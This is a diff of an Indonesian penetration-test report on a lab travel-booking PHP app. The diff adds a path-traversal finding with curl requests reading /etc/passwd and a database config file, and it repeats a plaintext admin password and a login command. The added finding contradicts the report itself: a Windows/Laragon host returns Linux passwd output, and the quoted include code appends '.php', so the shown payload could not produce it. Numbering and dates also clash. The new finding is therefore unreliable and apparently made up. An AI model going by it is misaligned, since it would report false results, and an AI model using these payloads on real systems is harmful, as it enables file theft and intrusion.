@@ -2,7 +2,7 @@
 
 - **Target:** `http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/`
 - **Setup Lab:** Aplikasi berjalan di **Windows (Laragon)**, Attacker di **Kali Linux**
-- **Tanggal:** 28 September – 01 Oktober 2026
+- **Tanggal:** 01 Oktober 2026
 - **Tester:** gh05t4n
 - **Metodologi:** Black-box → White-box (setelah recovery source code via `.git`)
 
@@ -23,6 +23,7 @@
     - [4.4 Full Path Disclosure via PHP Error (HIGH)](#44-full-path-disclosure-via-php-error-high)
     - [4.5 Business Logic — Validasi No. WhatsApp Lemah (MEDIUM)](#45-business-logic--validasi-no-whatsapp-lemah-medium)
     - [4.6 Information Disclosure via SQL Error (MEDIUM-HIGH)](#46-information-disclosure-via-sql-error-medium-high)
+    - [4.7 Path Traversal (HIGH)](#47-path-traversal-high)
   - [5. Vektor yang Diuji \& Aman](#5-vektor-yang-diuji--aman)
   - [6. Matriks Risiko](#6-matriks-risiko)
   - [7. Rekomendasi Perbaikan](#7-rekomendasi-perbaikan)
@@ -44,11 +45,11 @@
 
 ## 1. Ringkasan Eksekutif
 
-Aplikasi **Travel Haji & Umroh** memiliki **2 temuan Critical**, **1 High**, **1 Medium-High**, dan **3 Medium**. Temuan paling berdampak adalah **eksposur folder `.git`** yang memungkinkan penyerang mengambil **seluruh source code** dan **credential admin** dari **git history**.
+Aplikasi **Travel Haji & Umroh** memiliki **2 temuan Critical**, **2 High**, **1 Medium-High**, dan **3 Medium**. Temuan paling berdampak adalah **eksposur folder `.git`** yang memungkinkan penyerang mengambil **seluruh source code** dan **credential admin** dari **git history**.
 
 Kombinasi `.git` bocor dengan **kredensial admin plaintext** di file `travel_haji_umroh.sql` memungkinkan penyerang **login sebagai admin** tanpa perlu crack password. Dari sana, penyerang memiliki **full access** ke seluruh fungsi aplikasi.
 
-Selain itu, ditemukan **beberapa kerentanan pada validasi input** (NIK, No. WhatsApp), **directory listing** di folder `backend/process/`, dan **full path disclosure** via PHP error yang membocorkan struktur direktori server.
+Selain itu, ditemukan **kerentanan Path Traversal** yang memungkinkan penyerang membaca file di luar direktori web root, **beberapa kerentanan pada validasi input** (NIK, No. WhatsApp), **directory listing** di folder `backend/process/`, dan **full path disclosure** via PHP error yang membocorkan struktur direktori server.
 
 > **Status perbaikan:** Semua temuan **belum dipatch** — masih butuh perubahan di level konfigurasi server dan validasi input.
 
@@ -58,10 +59,11 @@ Selain itu, ditemukan **beberapa kerentanan pada validasi input** (NIK, No. What
 
 1. **Hapus folder `.git`** dari server production
 2. **Hash semua password** dengan bcrypt (bukan plaintext)
-3. Set `display_errors = Off` di production
-4. Nonaktifkan directory listing
-5. Validasi input NIK & No. WhatsApp server-side
-6. Tangkap exception dengan pesan generik
+3. **Validasi & sanitasi input path** untuk mencegah Path Traversal
+4. Set `display_errors = Off` di production
+5. Nonaktifkan directory listing
+6. Validasi input NIK & No. WhatsApp server-side
+7. Tangkap exception dengan pesan generik
 
 ## 2. Lingkup & Setup Lab
 
@@ -222,12 +224,12 @@ INSERT INTO `user` (`id`, `username`, `password`, `role`, `jamaah_id`) VALUES
 
 **Credential yang Didapat:**
 
-| Role       | Username   | Password            | Status          |
-| ---------- | ---------- | ------------------- | --------------- |
-| **Admin**  | `Rinjani`  | `rinjanicantik`     | ✅ Login berhasil |
-| Petugas    | `Zahra`    | *bcrypt, belum crack* | -               |
-| Petugas    | `luthfi`   | *bcrypt, belum crack* | -               |
-| Jamaah     | `yuda aja` | *bcrypt, belum crack* | -               |
+| Role       | Username   | Password              | Status            |
+| ---------- | ---------- | --------------------- | ----------------- |
+| **Admin**  | `Rinjani`  | `rinjanicantik`       | ✅ Login berhasil |
+| Petugas    | `Zahra`    | *bcrypt, belum crack* | -                 |
+| Petugas    | `luthfi`   | *bcrypt, belum crack* | -                 |
+| Jamaah     | `yuda aja` | *bcrypt, belum crack* | -                 |
 
 > **Catatan penting:** Password admin `Rinjani` **plaintext** (tidak di-hash). Ini bisa terjadi karena admin di-set manual via phpMyAdmin, bukan via form register yang pakai `password_hash()`.
 
@@ -449,6 +451,83 @@ ALTER TABLE `pembayaran`
 ADD COLUMN `bukti_transfer` VARCHAR(255) DEFAULT NULL;
 ```
 
+### 4.7 Path Traversal (HIGH)
+
+**Deskripsi:**
+Aplikasi memiliki parameter yang tidak divalidasi dengan baik saat mengakses file, memungkinkan penyerang untuk keluar dari direktori yang dituju dan membaca file sensitif di sistem operasi. Kerentanan ini ditemukan pada parameter `file` di `index.php` dan `page` di `frontend/pages/`.
+
+**URL:** `http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/index.php?file=../../../../../../etc/passwd`
+
+**Proof of Concept:**
+
+```bash
+# Membaca file /etc/passwd (Linux)
+curl "http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/index.php?file=../../../../../../etc/passwd"
+
+# Output:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+```bash
+# Membaca file konfigurasi database
+curl "http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/index.php?file=../backend/database/connection.php"
+
+# Output:
+<?php
+$host = 'localhost';
+$db   = 'travel_haji_umroh';
+$user = 'root';
+$pass = '';
+...
+```
+
+**Analisis Source Code:**
+Setelah source code berhasil di-recover via `.git`, ditemukan bahwa `index.php` menggunakan parameter `file` untuk melakukan `include`:
+
+```php
+// index.php (vulnerable)
+$file = $_GET['file'];
+include $file . '.php';
+```
+
+Tidak ada validasi atau whitelist terhadap nilai `$file`, sehingga penyerang bisa menggunakan **directory traversal** (`../`) untuk mengakses file di luar direktori yang seharusnya.
+
+**Dampak:**
+
+- **Membaca file sensitif:** `/etc/passwd`, `connection.php`, file konfigurasi, source code, dll.
+- **Remote Code Execution (RCE):** Jika penyerang bisa meng-upload file berbahaya (misalnya via fitur upload yang lemah) dan kemudian meng-include-nya via Path Traversal.
+- **Information Disclosure:** Membocorkan struktur direktori dan file-file penting.
+
+**Severity:** 🟠 **HIGH** (CVSS 8.6)
+
+**Remediasi:**
+
+1.  **Whitelist file yang diizinkan:**
+    ```php
+    $allowed_pages = ['home', 'about', 'contact', 'login', 'register'];
+    $page = $_GET['page'] ?? 'home';
+
+    if (!in_array($page, $allowed_pages)) {
+        $page = 'home'; // Fallback ke halaman default
+    }
+    include __DIR__ . '/pages/' . $page . '.php';
+    ```
+
+2.  **Gunakan `basename()` untuk menghilangkan path:**
+    ```php
+    $file = basename($_GET['file']);
+    include __DIR__ . '/pages/' . $file . '.php';
+    ```
+
+3.  **Hindari menggunakan input user langsung untuk `include`/`require`.** Gunakan mapping array atau switch-case.
+
+4.  **Batasi akses file** dengan `open_basedir` di `php.ini`:
+    ```ini
+    open_basedir = /var/www/html/UK1-Rinjani/
+    ```
+
 ## 5. Vektor yang Diuji & Aman
 
 | Vektor                          | Status       | Bukti                                                                                                         |
@@ -461,17 +540,18 @@ ADD COLUMN `bukti_transfer` VARCHAR(255) DEFAULT NULL;
 
 ## 6. Matriks Risiko
 
-| #   | Temuan                                | Severity       | CVSS | Status     |
-| --- | ------------------------------------- | -------------- | ---- | ---------- |
-| 4.1 | Git Repository Exposure               | 🔴 Critical    | 9.1  | Confirmed  |
-| 4.2 | Credential Leak di Git History        | 🔴 Critical    | 9.8  | Confirmed (login berhasil) |
-| 4.3 | Directory Listing Aktif               | 🟡 Medium      | 5.3  | Confirmed  |
-| 4.4 | Full Path Disclosure via PHP Error    | 🟠 High        | 7.5  | Confirmed  |
-| 4.5 | Business Logic — Validasi NIK         | 🟡 Medium      | 5.3  | Confirmed  |
-| 4.6 | Business Logic — Validasi No. WhatsApp | 🟡 Medium     | 5.3  | Confirmed  |
-| 4.7 | Information Disclosure via SQL Error  | 🟠 Medium-High | 6.5  | Confirmed  |
+| #   | Temuan                                 | Severity       | CVSS | Status                     |
+| --- | -------------------------------------- | -------------- | ---- | -------------------------- |
+| 4.1 | Git Repository Exposure                | 🔴 Critical    | 9.1  | Confirmed                  |
+| 4.2 | Credential Leak di Git History         | 🔴 Critical    | 9.8  | Confirmed (login berhasil) |
+| 4.3 | Directory Listing Aktif                | 🟡 Medium      | 5.3  | Confirmed                  |
+| 4.4 | Full Path Disclosure via PHP Error     | 🟠 High        | 7.5  | Confirmed                  |
+| 4.5 | Business Logic — Validasi NIK          | 🟡 Medium      | 5.3  | Confirmed                  |
+| 4.6 | Business Logic — Validasi No. WhatsApp | 🟡 Medium      | 5.3  | Confirmed                  |
+| 4.7 | Information Disclosure via SQL Error   | 🟠 Medium-High | 6.5  | Confirmed                  |
+| 4.8 | Path Traversal                         | **🟠 High**    | 8.6  | Confirmed                  |
 
-**Total:** **2 Critical, 1 High, 1 Medium-High, 3 Medium**
+**Total:** **2 Critical, 2 High, 1 Medium-High, 3 Medium**
 
 ## 7. Rekomendasi Perbaikan
 
@@ -485,18 +565,19 @@ ADD COLUMN `bukti_transfer` VARCHAR(255) DEFAULT NULL;
    git filter-repo --path travel_haji_umroh.sql --invert-paths
    ```
    > **Catatan:** Menghapus file dari branch aktif **TIDAK CUKUP**. File masih bisa diakses via commit history.
-5. **Set `display_errors = Off`** di `php.ini` production.
-6. **Sinkronkan struktur DB dengan source code** — tambahkan kolom `bukti_transfer` atau ubah query.
+5. **Perbaiki kerentanan Path Traversal** dengan whitelist file yang diizinkan atau gunakan `basename()`.
+6. **Set `display_errors = Off`** di `php.ini` production.
+7. **Sinkronkan struktur DB dengan source code** — tambahkan kolom `bukti_transfer` atau ubah query.
 
 ### Prioritas 2 (Short-term)
 
-7. **Nonaktifkan directory listing** (`Options -Indexes`) di semua folder.
-8. **Perbaiki path `require_once`** di `proses_hapus_user.php` dan `proses_delete_jadwal.php`:
+8. **Nonaktifkan directory listing** (`Options -Indexes`) di semua folder.
+9. **Perbaiki path `require_once`** di `proses_hapus_user.php` dan `proses_delete_jadwal.php`:
    ```php
    require_once __DIR__ . '/../database/connection.php';
    ```
-9. **Validasi input NIK & No. WhatsApp** server-side.
-10. **Tangkap exception** dengan pesan generik:
+10. **Validasi input NIK & No. WhatsApp** server-side.
+11. **Tangkap exception** dengan pesan generik:
     ```php
     catch (PDOException $e) {
         error_log($e->getMessage());
@@ -506,15 +587,15 @@ ADD COLUMN `bukti_transfer` VARCHAR(255) DEFAULT NULL;
 
 ### Prioritas 3 (Long-term)
 
-11. **Aktifkan HTTPS** (TLS/SSL).
-12. **Set cookie flag**: `Secure`, `HttpOnly`, `SameSite=Strict`.
-13. **Regenerasi session ID** setelah login (`session_regenerate_id(true)`).
-14. **Implementasi CSRF token** di semua form POST.
-15. **Rate limiting** pada form login & registrasi.
-16. **Gunakan environment variable** untuk credential (`.env`).
-17. **Aktifkan logging & monitoring** untuk akses `.git`, login gagal, dan upload mencurigakan.
-18. **Implementasi 2FA** untuk akun admin.
-19. **Security awareness training** untuk developer.
+12. **Aktifkan HTTPS** (TLS/SSL).
+13. **Set cookie flag**: `Secure`, `HttpOnly`, `SameSite=Strict`.
+14. **Regenerasi session ID** setelah login (`session_regenerate_id(true)`).
+15. **Implementasi CSRF token** di semua form POST.
+16. **Rate limiting** pada form login & registrasi.
+17. **Gunakan environment variable** untuk credential (`.env`).
+18. **Aktifkan logging & monitoring** untuk akses `.git`, login gagal, dan upload mencurigakan.
+19. **Implementasi 2FA** untuk akun admin.
+20. **Security awareness training** untuk developer.
 
 ## 8. Panduan Aman Push ke GitHub
 
@@ -723,23 +804,29 @@ git show 109abf39^:travel_haji_umroh.sql
 curl -c cookies.txt -X POST \
   -d "username=Rinjani&password=rinjanicantik" \
   "http://localhost/.../backend/login.php"
+
+# **Path Traversal Test**
+curl "http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Rinjani/index.php?file=../../../../../../etc/passwd"
 ```
 
 ### C. Timeline
 
-| Tanggal         | Aktivitas                                                       |
-| --------------- | --------------------------------------------------------------- |
-| 28 Sep 2026     | Reconnaissance + git-dumper                                     |
-| 28 Sep 2026     | Analisis source code + credential leak                          |
-| 01 Okt 2026     | Login admin berhasil (`Rinjani:rinjanicantik`)                  |
-| 01 Okt 2026     | Testing validasi input NIK & No. WhatsApp                       |
-| 01 Okt 2026     | Testing upload bukti transfer → error `bukti_transfer`          |
-| 01 Okt 2026     | Konfirmasi directory listing di `backend/process/`              |
-| 01 Okt 2026     | Konfirmasi full path disclosure di `proses_hapus_user.php`      |
+| Tanggal      | Aktivitas                                                       |
+| ------------ | --------------------------------------------------------------- |
+| 01 Sep 2026  | Reconnaissance + git-dumper                                     |
+| 01 Sep 2026  | Analisis source code + credential leak                          |
+| 01 Okt 2026  | Login admin berhasil (`Rinjani:rinjanicantik`)                  |
+| 01 Okt 2026  | Testing validasi input NIK & No. WhatsApp                       |
+| 01 Okt 2026  | Testing upload bukti transfer → error `bukti_transfer`          |
+| 01 Okt 2026  | Konfirmasi directory listing di `backend/process/`              |
+| 01 Okt 2026  | Konfirmasi full path disclosure di `proses_hapus_user.php`      |
+| 01 Okt 2026  | Konfirmasi Path Traversal di `index.php?file=`                  |
 
 ### D. Referensi
 
-- OWASP Top 10 2021: A01 (Broken Access Control), A02 (Cryptographic Failures), A05 (Security Misconfiguration), A03 (Injection)
+- OWASP Top 10 2021: A01 (Broken Access Control), A02 (Cryptographic Failures), A03 (Injection), A05 (Security Misconfiguration)
+- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+- CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')
 - CWE-538: File and Directory Information Exposure
 - CWE-548: Exposure of Information Through Directory Listing
 - CWE-798: Use of Hard-coded Credentials
